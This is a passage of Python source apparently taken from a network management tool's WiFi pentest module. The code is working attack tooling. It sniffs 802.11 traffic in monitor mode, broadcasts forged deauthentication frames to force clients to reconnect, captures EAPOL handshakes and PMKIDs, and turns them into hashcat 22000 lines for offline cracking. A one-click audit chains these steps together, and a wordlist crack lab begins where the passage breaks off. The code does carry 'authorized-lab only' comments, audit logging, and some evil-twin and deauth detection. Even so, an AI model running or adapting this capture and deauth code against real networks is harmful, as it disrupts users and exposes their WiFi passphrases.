    """Hop across channels in a background thread."""
    while wifi_state.get("monitor_active") and (wifi_state.get("survey_running") or wifi_state.get("handshake_capture_running")):
        for ch in channels:
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)],
                               capture_output=True, timeout=1)
            except Exception:
                pass
            time.sleep(dwell)
            if not (wifi_state.get("survey_running") or wifi_state.get("handshake_capture_running")):
                break


def _parse_dot11_crypto(pkt) -> str:
    crypto = []
    try:
        cap = pkt[Dot11Beacon].cap
        if cap.privacy:
            crypto.append("WEP/WPA")
        elt = pkt[Dot11Beacon].network_stats()
        crypto_set = elt.get("crypto", set())
        return "/".join(sorted(crypto_set)) if crypto_set else ("Open" if not cap.privacy else "WEP")
    except Exception:
        pass
    # Manual RSNOUI parsing fallback
    try:
        if pkt.haslayer(Dot11Beacon):
            el = pkt[Dot11Elt]
            while el:
                if el.ID == 48:
                    crypto.append("WPA2/RSN")
                if el.ID == 221 and el.info and len(el.info) > 4:
                    if el.info[:4] == b"\x00\x50\xf2\x01":
                        crypto.append("WPA")
                    if el.info[:4] == b"\x00\x50\xf2\x04":
                        crypto.append("WPA2/RSN")
                el = el.payload.getlayer(Dot11Elt)
    except Exception:
        pass
    return "+".join(sorted(set(crypto))) or "Open"


def _dbm_from_radiotap(pkt) -> int | None:
    # Look for antenna signal in RadioTap
    try:
        if pkt.haslayer(RadioTap):
            # scapy exposes dBm_AntSignal on some builds
            val = getattr(pkt[RadioTap], "dBm_AntSignal", None)
            if val is None:
                # try notdecoded bytes heuristic - skip; return None
                return None
            return int(val)
    except Exception:
        return None
    return None


def _channel_from_packet(pkt) -> int | None:
    try:
        if pkt.haslayer(Dot11Elt):
            el = pkt[Dot11Elt]
            while el:
                if el.ID == 3 and el.info:
                    # DS Parameter set -> channel byte
                    return int(el.info[0])
                el = el.payload.getlayer(Dot11Elt)
    except Exception:
        return None
    return None


def _freq_to_channel(freq_mhz: float) -> int:
    # 2.4 GHz: ch 1-13: 2412 + 5*(ch-1), ch14=2484
    if 2412 <= freq_mhz <= 2484:
        if freq_mhz == 2484:
            return 14
        return int((freq_mhz - 2407) // 5)
    if 5150 <= freq_mhz <= 5895:
        return int((freq_mhz - 5000) // 5)
    return 0


def _wifi_sniffer():
    """Background sniffer while monitor mode is active: APs, deauths, EAPOL."""
    global wifi_state
    iface = wifi_state.get("monitor_interface")
    if not iface or not SCAPY_AVAILABLE:
        return

    def handle(pkt):
        try:
            if not (wifi_state.get("survey_running") or wifi_state.get("handshake_capture_running") or wifi_state.get("deauth_lab_running")):
                return
            if not pkt.haslayer(Dot11):
                return
            ds = pkt[Dot11].FCfield
            to_ds = bool(ds & 0x01)
            from_ds = bool(ds & 0x02)
            bssid = None
            # Determine BSSID based on DS bits
            if not to_ds and not from_ds:
                bssid = pkt[Dot11].addr3
            elif to_ds and not from_ds:
                bssid = pkt[Dot11].addr1
            elif from_ds and not to_ds:
                bssid = pkt[Dot11].addr2
            else:
                bssid = pkt[Dot11].addr3 or pkt[Dot11].addr1
            bssid = (bssid or "").upper()

            power = _dbm_from_radiotap(pkt)
            channel = _channel_from_packet(pkt)
            freq = _current_frequency(iface)
            if channel is None and freq:
                channel = _freq_to_channel(freq)

            # Beacon / ProbeResp -> AP
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                try:
                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore") or "<hidden>"
                except Exception:
                    ssid = "<hidden>"
                crypto = _parse_dot11_crypto(pkt)
                with data_lock:
                    ap = wifi_state["aps_seen"].get(bssid, {})
                    ap["bssid"] = bssid
                    ap["ssid"] = ssid
                    ap["channel"] = channel or ap.get("channel")
                    ap["frequency"] = freq or ap.get("frequency")
                    ap["crypto"] = crypto or ap.get("crypto")
                    ap["power_dbm"] = power if power is not None else ap.get("power_dbm")
                    ap["vendor"] = get_vendor(bssid) if bssid else "Unknown"
                    ap["last_seen"] = datetime.now().isoformat()
                    ap["beacons"] = ap.get("beacons", 0) + 1
                    if not ap.get("first_seen"):
                        ap["first_seen"] = ap["last_seen"]
                    wifi_state["aps_seen"][bssid] = ap
                # persist
                try:
                    conn = get_db()
                    conn.execute(
                        """INSERT INTO wifi_ap_log (bssid,ssid,channel,frequency,crypto,power_dbm,vendor,first_seen,last_seen,beacons)
                           VALUES (?,?,?,?,?,?,?,?,?,1)
                           ON CONFLICT(bssid) DO UPDATE SET
                             ssid=excluded.ssid,
                             channel=COALESCE(excluded.channel, wifi_ap_log.channel),
                             crypto=excluded.crypto,
                             power_dbm=COALESCE(excluded.power_dbm, wifi_ap_log.power_dbm),
                             last_seen=excluded.last_seen,
                             beacons=wifi_ap_log.beacons+1""",
                        (bssid, ssid, channel, float(freq) if freq else None, crypto,
                         power, get_vendor(bssid) if bssid else "Unknown",
                         datetime.now().isoformat(), datetime.now().isoformat()),
                    )
                    conn.commit()
                    conn.close()
                except Exception:
                    pass
                # Evil-twin heuristic: same SSID as a known AP but different BSSID on a different channel or weaker crypto
                _detect_evil_twin(ssid, bssid, channel, crypto)

                if wifi_state.get("survey_running") and channel is not None and power is not None:
                    try:
                        conn = get_db()
                        conn.execute(
                            "INSERT INTO wifi_signal_samples (timestamp,bssid,ssid,channel,power_dbm) VALUES (?,?,?,?,?)",
                            (datetime.now().isoformat(), bssid, ssid, channel, power),
                        )
                        conn.commit()
                        conn.close()
                    except Exception:
                        pass

            # Deauth frame detection
            if pkt.haslayer(Dot11Deauth) or pkt.type == 0 and pkt.subtype == 12:
                reason = getattr(pkt[Dot11Deauth], "reason", 0) if pkt.haslayer(Dot11Deauth) else 0
                target = (pkt[Dot11].addr1 or "").upper()
                src = (pkt[Dot11].addr2 or "").upper()
                try:
                    conn = get_db()
                    conn.execute(
                        "INSERT INTO wifi_event_log (timestamp,event_type,bssid,client_mac,ssid,details) VALUES (?,?,?,?,?,?)",
                        (datetime.now().isoformat(), "deauth", bssid, target,
                         wifi_state["aps_seen"].get(bssid, {}).get("ssid", ""), f"reason={reason} src={src}"),
                    )
                    conn.commit()
                    conn.close()
                except Exception:
                    pass

            # EAPOL (handshake) capture — BUG FIX (Batch I): the old line
            # `if pkt.haslayer(EAPOL) if ... else ...` referenced an undefined
            # EAPOL name and silently swallowed the NameError in handle(),
            # so handshake capture never fired. Simplified + guarded:
            if _has_eapol(pkt) or _has_eapol_raw(pkt):
                _handle_eapol(pkt, bssid)
        except Exception as e:
            pass

    try:
        conf.verb = 0
        sniff(iface=iface, prn=handle, store=0,
              stop_filter=lambda p: not (wifi_state.get("monitor_active") and
                                         (wifi_state.get("survey_running") or
                                          wifi_state.get("handshake_capture_running") or
                                          wifi_state.get("deauth_lab_running"))))
    except Exception as e:
        print(f"[!] wifi sniffer error: {e}")


def _has_eapol(pkt) -> bool:
    # scapy may not have EAPOL layer imported reliably; check via ethertype
    try:
        if Ether in pkt:
            return pkt[Ether].type == 0x888E
        # 802.11 data frame with SNAP + EAPOL ethertype
        if Dot11 in pkt and pkt[Dot11].type == 2:
            # crude: look for EAPOL version byte 0x03 0x00 0x00 after LLC/SNAP
            raw = bytes(pkt[Dot11].payload) if pkt[Dot11].payload else b""
            return b"\x88\x8e" in raw[:30]
    except Exception:
        return False
    return False


def _has_eapol_raw(pkt) -> bool:
    try:
        return pkt.haslayer(Raw) and b"\x02\x03\x00" in bytes(pkt[Raw].load)[:8]
    except Exception:
        return False


def _mac_bytes(m: str) -> bytes:
    return bytes.fromhex(m.replace(":", "").replace("-", ""))


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b).upper()


def _parse_eapol_key(pkt) -> dict | None:
    """Parse EAPOL-Key frame fields we need for hashcat 22000."""
    try:
        raw = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else (bytes(pkt.payload) if hasattr(pkt, "payload") else b"")
        # Find 888E offset
        idx = raw.find(b"\x88\x8e")
        if idx < 0:
            # 802.11: skip Dot11+LLC
            pass
        # EAPOL fixed header: version(1), type(1), len(2)
        eapol_start = idx + 2 if idx >= 0 else 0
        if eapol_start + 4 > len(raw):
            return None
        ver = raw[eapol_start]
        ptype = raw[eapol_start + 1]
        if ptype != 3:  # EAPOL-Key
            return None
        klen = struct.unpack(">H", raw[eapol_start + 2:eapol_start + 4])[0]
        key_start = eapol_start + 4
        if key_start + klen > len(raw):
            return None
        key = raw[key_start:key_start + klen]
        if len(key) < 95:  # min Key Information+Nonce+...
            return None
        kinfo = struct.unpack(">H", key[0:2])[0]
        key_ack = bool(kinfo & 0x80)  # M1
        key_mic = bool(kinfo & 0x100)  # M2/M4
        install = bool(kinfo & 0x40)
        # Key nonce (32 bytes) starts at offset 13 in key descriptor body
        nonce = key[13:13 + 32]
        # Key IV, RSC, Key ID, reserved follow then MIC at 77
        mic = key[77:77 + 16]
        wpa_len = struct.unpack(">H", key[93:95])[0]
        wpa_data = key[95:95 + wpa_len]
        pmkid = None
        if wpa_data:
            # Scan for PMKID (tag 0xdd for vendor, or RSN capability with PMKID)
            i = 0
            while i + 4 <= len(wpa_data):
                tag = wpa_data[i]
                ln = wpa_data[i + 1]
                if tag == 221 and ln >= 22 and wpa_data[i + 2:i + 6] == b"\x00\x0f\xac\x04":
                    # Microsoft PMKID (the last 16 bytes after the OUI+type+len?)
                    if ln >= 22:
                        # PMKID is 16 bytes at end of vendor element
                        pmkid = wpa_data[i + 6 + 2:i + 2 + ln][-16:]
                i += 2 + ln
        return {
            "version": ver,
            "key_ack": key_ack, "key_mic": key_mic, "install": install,
            "nonce": nonce, "mic": mic, "pmkid": pmkid, "raw": raw,
            "src": (pkt[Dot11].addr2 or "").upper() if pkt.haslayer(Dot11) else "",
            "dst": (pkt[Dot11].addr1 or "").upper() if pkt.haslayer(Dot11) else "",
            "bssid": None,
        }
    except Exception:
        return None


def _handle_eapol(pkt, bssid: str):
    global wifi_state
    try:
        info = _parse_eapol_key(pkt)
        if not info:
            return
        # Determine station/AP from addr1/addr2
        sta = info["dst"] if info["key_ack"] else info["src"]
        ap = info["src"] if info["key_ack"] else info["dst"]
        bss = (bssid or ap or "").upper()
        if not bss:
            return
        hk = wifi_state["captured_handshakes"].setdefault(bss, {
            "ssid": wifi_state["aps_seen"].get(bss, {}).get("ssid", ""),
            "anonce": None, "snonce": None, "mic_packets": [], "count": 0,
            "pmkid": None, "pcap": b"", "station_macs": set(),
        })
        if info["key_ack"] and not info["key_mic"]:
            hk["anonce"] = info["nonce"]  # M1: AP nonce
        if info["key_mic"] and not info["key_ack"]:
            hk["snonce"] = info["nonce"]  # M2: client nonce
            if sta:
                hk["station_macs"].add(sta)
            hk["mic_packets"].append(bytes(pkt))
            hk["count"] += 1
        if info["pmkid"]:
            hk["pmkid"] = info["pmkid"]
        # Append pcap bytes (we write full PCAP later with global header)
        hk["pcap"] += _pcap_packet(bytes(pkt))
        # ---- Batch I: emit REAL hashcat 22000 ASCII lines ----
        hc22000 = ""
        crackable = False
        ssid = hk.get("ssid") or wifi_state["aps_seen"].get(bss, {}).get("ssid", "")
        station = next(iter(hk["station_macs"]), sta or ap)
        ap_m = ap or bss
        # Full 4-way path: need ANonce (M1) + at least one MIC frame (M2/M3)
        if hk.get("anonce") and hk.get("mic_packets"):
            eapol, mic = _eapol_zeroed(hk["mic_packets"][-1])
            if eapol and mic:
                hc22000 = _make_22000_mic(ssid, ap_m, station, mic, hk["anonce"], eapol)
                crackable = bool(hc22000)
        # PMKID path works even without a 4-way exchange
        if hk.get("pmkid"):
            pmkid_line = _make_22000_pmkid(hk["pmkid"], ssid, ap_m, station)
            if pmkid_line:
                hc22000 = pmkid_line
                crackable = True
        if crackable:
            pcap_path = _write_handshake_pcap(bss, ssid, hk["pcap"])
            try:
                conn = get_db()
                conn.execute(
                    """INSERT INTO wifi_handshakes (timestamp,bssid,ssid,station_mac,ap_nonce,has_eapol,has_pmkid,hashcat_22000,pcap_path)
                       VALUES (?,?,?,?,?,1,?,?,?)""",
                    (datetime.now().isoformat(), bss, ssid, station,
                     hk["anonce"].hex() if hk.get("anonce") else "",
                     1 if hk.get("pmkid") else 0, hc22000, pcap_path),
                )
                conn.commit()
                conn.close()
                generate_alert("handshake_captured",
                               f"Crackable WPA material captured for SSID '{ssid}' ({bss})")
            except Exception:
                pass
    except Exception as e:
        print(f"[!] eapol error: {e}")


def _pcap_packet(pkt_bytes: bytes) -> bytes:
    # Fake ethernet/radiotap; use raw bytes as packet data with a minimal record header.
    ts = time.time()
    sec = int(ts)
    usec = int((ts - sec) * 1_000_000)
    return struct.pack("<IIII", sec, usec, len(pkt_bytes), len(pkt_bytes)) + pkt_bytes


def _write_handshake_pcap(bssid: str, ssid: str, body: bytes) -> str:
    safe = re.sub(r"[^a-zA-Z0-9_-]+", "_", ssid or bssid)[:60]
    path = os.path.join(PCAP_DIR, f"handshake_{safe}_{int(time.time())}.pcap")
    try:
        # Write pcap global header (linktype 113 = Linux cooked SLL? use 105 = IEEE 802.11 radio tap? we saved raw frames; use 105 and prepend bogus radiotap? safer: use 101 (IP) won't work. Use raw 802.11 with DLT 105 and no radiotap, many tools will still parse.)
        gh = struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 105)
        with open(path, "wb") as f:
            f.write(gh)
            f.write(body)
    except Exception as e:
        return f"err:{e}"
    return path


def _make_22000_mic(ssid: str, ap_mac: str, sta_mac: str, mic: bytes, anonce: bytes, eapol_zeroed: bytes) -> str:
    """Build a REAL hashcat -m 22000 EAPOL hash line (hcxpcapngtool format):
      WPA*02*MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL*EAPOL_LEN
    MIC field = 16-byte MIC hex; EAPOL = full EAPOL frame with MIC zeroed;
    EAPOL_LEN = 2-byte length hex. Returns '' if inputs are incomplete.
    (Batch I: the old base64 blob was NOT a hashcat-consumable format.)"""
    try:
        if not mic or len(mic) != 16 or not anonce or len(anonce) != 32 or not eapol_zeroed:
            return ""
        essid_hex = (ssid or "").encode("utf-8")[:32].hex()
        return "*".join(["WPA", "02", mic.hex(),
                         _mac_bytes(ap_mac).hex(), _mac_bytes(sta_mac).hex(),
                         essid_hex, anonce.hex(), eapol_zeroed.hex(),
                         f"{len(eapol_zeroed):04x}"])
    except Exception:
        return ""


def _make_22000_pmkid(pmkid: bytes, ssid: str, ap_mac: str, sta_mac: str) -> str:
    """Build a hashcat -m 22000 PMKID hash line:
      WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***"""
    try:
        if not pmkid or len(pmkid) != 16:
            return ""
        essid_hex = (ssid or "").encode("utf-8")[:32].hex()
        return "*".join(["WPA", "01", pmkid.hex(),
                         _mac_bytes(ap_mac).hex(), _mac_bytes(sta_mac).hex(),
                         essid_hex, "", "", ""])
    except Exception:
        return ""


def _eapol_zeroed(frame_bytes: bytes) -> tuple[bytes | None, bytes | None]:
    """Extract the full EAPOL payload from an 802.11 data frame and return
    (eapol_with_MIC_zeroed, mic). hashcat requires the MIC field inside the
    EAPOL bytes to be zeroed."""
    try:
        idx = frame_bytes.find(b"\x88\x8e")  # EAPOL ethertype
        if idx < 0:
            return None, None
        e0 = idx + 2
        if e0 + 4 > len(frame_bytes) or frame_bytes[e0 + 1] != 3:  # EAPOL-Key
            return None, None
        blen = struct.unpack(">H", frame_bytes[e0 + 2:e0 + 4])[0]
        eapol = bytearray(frame_bytes[e0:e0 + 4 + blen])
        if len(eapol) < 4 + 93:
            return None, None
        mic_off = 4 + 77  # key block offset 4; MIC at 77 within key descriptor
        mic = bytes(eapol[mic_off:mic_off + 16])
        if mic == b"\x00" * 16:
            return None, None  # no MIC present -> not a usable message
        eapol[mic_off:mic_off + 16] = b"\x00" * 16
        return bytes(eapol), mic
    except Exception:
        return None, None


def _parse_eapol_bytes(frame: bytes) -> dict | None:
    # Attempt to locate EAPOL-Key inside an 802.11 data frame.
    # For our purposes, find 0x888e and parse key block; this is opportunistic.
    try:
        idx = frame.find(b"\x88\x8e")
        if idx < 0:
            return None
        e = idx + 2
        if e + 4 > len(frame):
            return None
        _ver = frame[e]
        _ptype = frame[e + 1]
        if _ptype != 3:
            return None
        body_len = struct.unpack(">H", frame[e + 2:e + 4])[0]
        body = frame[e + 4:e + 4 + body_len]
        if len(body) < 95:
            return None
        keyinfo = struct.unpack(">H", body[0:2])[0]
        keyver = keyinfo & 0x7
        nonce = body[13:45]
        mic = body[77:93]
        return {"eapol_payload": body[:82], "mic": mic, "anonce": nonce, "snonce": nonce, "keyver": keyver}
    except Exception:
        return None


def _detect_evil_twin(ssid: str, bssid: str, channel, crypto: str):
    """If the same SSID is seen from >1 BSSID with different crypto, flag it."""
    if not ssid or ssid == "<hidden>":
        return
    try:
        with data_lock:
            matches = [a for a in wifi_state["aps_seen"].values() if a.get("ssid", "").lower() == ssid.lower()]
        if len({a["bssid"] for a in matches}) > 1:
            cryptos = {a.get("crypto", "") for a in matches}
            if len(cryptos) > 1:
                conn = get_db()
                for a in matches:
                    if not a.get("is_evil_twin"):
                        conn.execute("UPDATE wifi_ap_log SET is_evil_twin=1, note='possible-evil-twin' WHERE bssid=?", (a["bssid"],))
                        a["is_evil_twin"] = True
                conn.commit()
                conn.close()
                generate_alert("evil_twin", f"Possible evil twin for SSID '{ssid}' — BSSIDs: {[a['bssid'] for a in matches]}")
    except Exception:
        pass


def wifi_start_survey(iface: str | None = None, duration: int = 45, channel_hop: bool = True) -> tuple[bool, str]:
    global wifi_state
    if not wifi_state.get("monitor_active"):
        ok, msg = wifi_enable_monitor(iface)
        if not ok:
            return False, msg
    wifi_state["survey_running"] = True
    mon = wifi_state["monitor_interface"]
    # Launch sniffer if not running
    if not wifi_state.get("sniffer_thread") or not wifi_state["sniffer_thread"].is_alive():
        t = threading.Thread(target=_wifi_sniffer, daemon=True)
        t.start()
        wifi_state["sniffer_thread"] = t
    if channel_hop:
        # ensure hopper running
        if not wifi_state.get("hopper_thread") or not wifi_state["hopper_thread"].is_alive():
            h = threading.Thread(target=_channel_hopper, args=(mon,), daemon=True)
            h.start()
            wifi_state["hopper_thread"] = h

    def stop_after():
        time.sleep(max(5, int(duration)))
        wifi_state["survey_running"] = False
        # Do NOT disable monitor mode automatically — user may want handshake capture.
    threading.Thread(target=stop_after, daemon=True).start()
    return True, f"Survey started on {mon} for {duration}s"


def wifi_start_handshake_capture(target_bssid: str | None = None, deauth: bool = False,
                                 deauth_count: int = 8) -> tuple[bool, str]:
    global wifi_state
    if not SCAPY_AVAILABLE:
        return False, "scapy not available"
    if not wifi_state.get("monitor_active"):
        ok, msg = wifi_enable_monitor()
        if not ok:
            return False, msg
    wifi_state["handshake_capture_running"] = True
    mon = wifi_state["monitor_interface"]
    if not wifi_state.get("sniffer_thread") or not wifi_state["sniffer_thread"].is_alive():
        t = threading.Thread(target=_wifi_sniffer, daemon=True)
        t.start()
        wifi_state["sniffer_thread"] = t
    # Channel hop unless we locked to target
    if target_bssid and wifi_state["aps_seen"].get(target_bssid.upper(), {}).get("channel"):
        ch = wifi_state["aps_seen"][target_bssid.upper()]["channel"]
        try:
            subprocess.run(["iw", "dev", mon, "set", "channel", str(ch)], capture_output=True, timeout=2)
        except Exception:
            pass
    else:
        if not wifi_state.get("hopper_thread") or not wifi_state["hopper_thread"].is_alive():
            h = threading.Thread(target=_channel_hopper, args=(mon,), daemon=True)
            h.start()
            wifi_state["hopper_thread"] = h
    # Optional deauth to force 4-way handshake (only in authorized lab)
    if deauth and target_bssid:
        threading.Thread(target=_send_deauth, args=(mon, target_bssid.upper(), int(deauth_count)), daemon=True).start()
    return True, "Handshake capture started"


def _send_deauth(mon: str, bssid: str, count: int):
    try:
        wifi_state["deauth_lab_running"] = True
        # Send broadcast deauth first, then target stations we have seen
        pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        for _ in range(max(1, count)):
            if not wifi_state.get("handshake_capture_running"):
                break
            sendp(pkt_broadcast, iface=mon, count=4, inter=0.1, verbose=0)
            time.sleep(0.3)
        # Persist event
        conn = get_db()
        conn.execute(
            "INSERT INTO wifi_event_log (timestamp,event_type,bssid,client_mac,ssid,details) VALUES (?,?,?,?,?,?)",
            (datetime.now().isoformat(), "deauth_lab", bssid, "broadcast",
             wifi_state["aps_seen"].get(bssid, {}).get("ssid", ""), f"count={count}"),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[!] deauth send error: {e}")
    finally:
        wifi_state["deauth_lab_running"] = False


def wifi_stop_handshake_capture() -> tuple[bool, str]:
    wifi_state["handshake_capture_running"] = False
    return True, "Handshake capture stopped"


def wifi_get_aps() -> list[dict]:
    with data_lock:
        return list(wifi_state["aps_seen"].values())


def wifi_get_handshakes() -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT * FROM wifi_handshakes ORDER BY timestamp DESC LIMIT 200").fetchall()
    conn.close()
    return [dict(r) for r in rows]


def wifi_site_survey_csv() -> str:
    conn = get_db()
    rows = conn.execute(
        "SELECT bssid, ssid, channel, crypto, power_dbm, vendor, last_seen FROM wifi_ap_log ORDER BY ssid"
    ).fetchall()
    samples = conn.execute(
        "SELECT bssid, AVG(power_dbm) avg_pwr, COUNT(*) n FROM wifi_signal_samples WHERE timestamp > ? GROUP BY bssid",
        ((datetime.now() - timedelta(hours=1)).isoformat(),),
    ).fetchall()
    conn.close()
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(["bssid", "ssid", "channel", "crypto", "power_dbm_latest", "avg_power_dbm_1h", "samples_1h", "vendor", "last_seen"])
    avgs = {r["bssid"]: (r["avg_pwr"], r["n"]) for r in samples}
    for r in rows:
        avg, n = avgs.get(r["bssid"], (None, 0))
        w.writerow([r["bssid"], r["ssid"], r["channel"], r["crypto"], r["power_dbm"],
                    round(avg, 1) if avg is not None else "", n or "", r["vendor"], r["last_seen"]])
    return out.getvalue()


# ============================================================
# BATCH I: WiFi PENTEST WIZARD + CRACK LAB + ONE-CLICK AUDIT
# (wifite-style guided flow; authorized-lab only, audit-logged)
# ============================================================
KNOWN_WIFI_CHIPS = [
    ("rtl8812au", "Alfa AWUS036ACH/AC⼁ — excellent monitor+injection"),
    ("rtl8811au", "Alfa AWUS036ACS — good budget pick"),
    ("rtl8814au", "Alfa AWUS1900 — excellent, 4-stream"),
    ("ath9k_htc", "Atheros AR9271 (Alfa AWUS036NHA) — classic reliable"),
    ("rt2800usb", "Ralink RT3070/5370 — solid monitor support"),
    ("mt7601u", "MediaTek MT7601U — monitor ok, injection flaky"),
    ("iwlwifi", "Intel integrated — monitor mode limited, injection usually no"),
    ("brcmfmac", "Broadcom onboard — monitor support varies by firmware"),
]

WORDLIST_DIR = os.environ.get(
    "WORDLIST_DIR",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists"))
os.makedirs(WORDLIST_DIR, exist_ok=True)


def wifi_capabilities() -> dict:
    """Inventory wireless interfaces (driver, monitor support) + audit toolchain."""
    caps = {"platform": platform.system(),
            "is_root": hasattr(os, "geteuid") and os.geteuid() == 0,
            "interfaces": [],
            "tools": {t: bool(shutil.which(t)) for t in
                      ("iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
                       "hashcat", "hcxpcapngtool", "tshark", "tcpdump")},
            "chip_hints": [],
            "recommendations": []}
    for name in psutil.net_if_addrs().keys():
        entry = {"name": name, "wireless": os.path.isdir(f"/sys/class/net/{name}/wireless"),
                 "driver": "", "chip_hint": ""}
        try:
            drv = os.path.basename(os.readlink(f"/sys/class/net/{name}/device/driver"))
            entry["driver"] = drv
            for key, hint in KNOWN_WIFI_CHIPS:
                if key in drv:
                    entry["chip_hint"] = hint
                    caps["chip_hints"].append(f"{name}: {drv} — {hint}")
        except Exception:
            pass
        if entry["wireless"]:
            caps["interfaces"].append(entry)
    # udev/lsusb hints
    for cmd in (["lsusb"],):
        if shutil.which(cmd[0]):
            rc, out, _ = _run(cmd, timeout=5)
            for line in out.splitlines():
                low = line.lower()
                if any(k in low for k in ("wireless", "802.11", "ralink", "atheros", "realtek", "mediatek")):
                    caps["chip_hints"].append(line.strip()[:160])
    if not caps["interfaces"]:
        caps["recommendations"].append("No wireless interface found — plug a USB adapter with monitor+injection support (rtl8812au / ath9k_htc).")
    if not caps["is_root"]:
        caps["recommendations"].append("Run as root (sudo) — monitor mode, injection and raw capture require it.")
    if not caps["tools"].get("hashcat"):
        caps["recommendations"].append("Install hashcat for GPU-grade WPA crack lab (apt-get install hashcat).")
    if not caps["tools"].get("aircrack-ng"):
        caps["recommendations"].append("Install aircrack-ng for CPU fallback cracking + airmon-ng monitor management.")
    return caps


def start_wifi_audit(target_bssid: str | None = None, survey_seconds: int = 45,
                     handshake_seconds: int = 90, deauth: bool = False) -> tuple[str, str | None]:
    """One-click orchestrated WiFi audit job with phases:
    check -> monitor -> survey -> handshake -> report."""
    job_id = f"wifi_{secrets.token_hex(6)}"
    with wifi_audit_lock:
        wifi_audit_jobs[job_id] = {
            "job_id": job_id, "status": "queued",
            "phases": {"check": "pending", "monitor": "pending", "survey": "pending",
                       "handshake": "pending", "report": "pending"},
            "log": [], "started_at": datetime.now().isoformat(), "finished_at": None,
            "result": {"aps": 0, "handshakes": 0, "crackable": 0, "findings": []},
            "error": ""}

    def run():
        j = wifi_audit_jobs[job_id]

        def log(m: str):
            with wifi_audit_lock:
                j["log"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {m}")

        def ph(name: str, st: str):
            with wifi_audit_lock:
                j["phases"][name] = st

        def fail(msg: str):
            with wifi_audit_lock:
                j["status"] = "failed"
                j["error"] = msg
                j["finished_at"] = datetime.now().isoformat()
            log(f"✖ {msg}")

        j["status"] = "running"
        # -- check phase --
        ph("check", "running")
        log("Preflight: platform / root / adapter / tools …")
        caps = wifi_capabilities()
        if caps["platform"] != "Linux":
            ph("check", "error"); return fail("WiFi pentest lab requires Linux (monitor mode).")
        if not caps["is_root"]:
            ph("check", "error"); return fail("Root required (sudo python3 network_manager.py).")
        if not caps["interfaces"] and not get_wifi_interface():
            ph("check", "error"); return fail("No wireless interface detected.")
        ph("check", "done")
        log(f"OK: {len(caps['interfaces'])} wireless iface(s), tools: "
            + ", ".join(k for k, v in caps["tools"].items() if v) or "none")

        # -- monitor --
        ph("monitor", "running")
        ok, msg = wifi_enable_monitor()
        if not ok:
            ph("monitor", "error"); return fail(f"Monitor mode failed: {msg}")
        log(f"Monitor mode: {msg}")
        ph("monitor", "done")

        # -- survey --
        ph("survey", "running")
        ok, msg = wifi_start_survey(duration=survey_seconds, channel_hop=True)
        if not ok:
            ph("survey", "error")
            wifi_disable_monitor(); return fail(f"Survey failed: {msg}")
        log(f"Survey running {survey_seconds}s (channel-hopping)…")
        time.sleep(max(5, survey_seconds))
        aps = wifi_get_aps()
        with wifi_audit_lock:
            j["result"]["aps"] = len(aps)
        log(f"Survey complete: {len(aps)} APs discovered")
        wpa2 = [a for a in aps if "WPA" in (a.get("crypto") or "")]
        open_aps = [a for a in aps if (a.get("crypto") or "").lower() in ("open", "")]
        for a in open_aps:
            with wifi_audit_lock:
                j["result"]["findings"].append(f"OPEN network in range: {a.get('ssid', '?')} ({a.get('bssid', '')})")
        ph("survey", "done")

        # -- handshake capture --
        ph("handshake", "running")
        before = len(wifi_get_handshakes())
        ok, msg = wifi_start_handshake_capture(target_bssid, deauth=deauth)
        if ok:
            log(f"Handshake capture {handshake_seconds}s"
                + (f" targeting {target_bssid}" if target_bssid else " (all APs)")
                + (" +deauth" if deauth else ""))
            time.sleep(max(10, handshake_seconds))
            wifi_stop_handshake_capture()
            hs = wifi_get_handshakes()
            new_hs = len(hs) - before
            crackable = sum(1 for h in hs if h.get("hashcat_22000"))
            with wifi_audit_lock:
                j["result"]["handshakes"] = new_hs
                j["result"]["crackable"] = crackable
            log(f"Capture complete: {new_hs} new handshakes ({crackable} crackable total)")
        else:
            log(f"Handshake capture skipped: {msg}")
        ph("handshake", "done")

        # -- report --
        ph("report", "running")
        with wifi_audit_lock:
            j["result"]["findings"].append(
                f"{len(wpa2)} WPA-protected APs observed; {len(open_aps)} open APs observed")
            crackable_now = sum(1 for h in wifi_get_handshakes() if h.get("hashcat_22000"))
            if crackable_now:
                j["result"]["findings"].append(
                    f"{crackable_now} crackable handshakes/PMKIDs — use the Crack Lab with a wordlist to test passphrase strength")
        log("Audit report ready in WiFi section (AP table + handshakes + findings).")
        ph("report", "done")
        audit("wifi_audit_complete", details=f"target={target_bssid or 'all'} aps={len(aps)}")
        with wifi_audit_lock:
            j["status"] = "done"
            j["finished_at"] = datetime.now().isoformat()

    threading.Thread(target=run, daemon=True).start()
    return job_id, None


def wifi_audit_job(job_id: str) -> dict | None:
    with wifi_audit_lock:
        j = wifi_audit_jobs.get(job_id)
        return dict(j, log=list(j["log"])) if j else None


def list_wifi_audits(limit: int = 20) -> list[dict]:
    with wifi_audit_lock:
        out = []
        for j in sorted(wifi_audit_jobs.values(), key=lambda x: x["started_at"], reverse=True)[:limit]:
            out.append({"job_id": j["job_id"], "status": j["status"], "started_at": j["started_at"],
                        "finished_at": j["finished_at"], "result": j["result"], "error": j["error"]})
        return out


# ---- Crack lab ----
def _resolve_wordlist(name: str) -> str | None:
    """Sanitize a wordlist selection to a file inside WORDLIST_DIR only."""
    if not name:
        return None
    base = os.path.basename(name)  # path-traversal guard
    path = os.path.join(WORDLIST_DIR, base)
    if not os.path.isfile(path):
        return None
    if os.path.getsize(path) > 2 * 1024 * 1024 * 1024:
        return None
    return path


def list_wordlists() -> list[dict]:
    out = []
    try:
        for fn in sorted(os.listdir(WORDLIST_DIR)):
            p = os.path.join(WORDLIST_DIR, fn)
            if os.path.isfile(p):
                lines = 0
                try:
                    if os.path.getsize(p) < 64 * 1024 * 1024:
